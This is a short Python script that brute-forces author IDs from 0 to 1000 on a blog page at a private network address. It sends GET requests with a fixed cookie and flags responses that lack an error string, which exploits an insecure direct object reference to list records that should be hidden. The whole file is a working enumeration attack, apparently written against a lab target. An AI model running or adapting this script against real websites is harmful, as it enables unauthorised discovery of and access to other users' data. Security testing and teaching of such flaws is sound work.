#################################################################
#Objective: 
# Brute-force for INsecureObjectReference
#Description: 
# GET request to know which are real id that normally can't
# be accessible
#Date:
# 24/09/2018
#################################################################

import requests

#content return when error
match='find any posts by author'

#parameter id number
i=0

#cookie to be include when GET requesting
cookie={'level':'1','lang':'USD'}

#number of parameter id to test
while i<=1000:

        #URL target
        url = "http://192.168.0.4/blog.php?author=%s" % i

        request = requests.get(url, cookies=cookie).text

        #detect if an id number is valid
        if match not in request:
                print('valid author id:',i)

        #inform the number of id tested
        i=i+1
        if i%100==0:
                print(i,'nth authors tested')
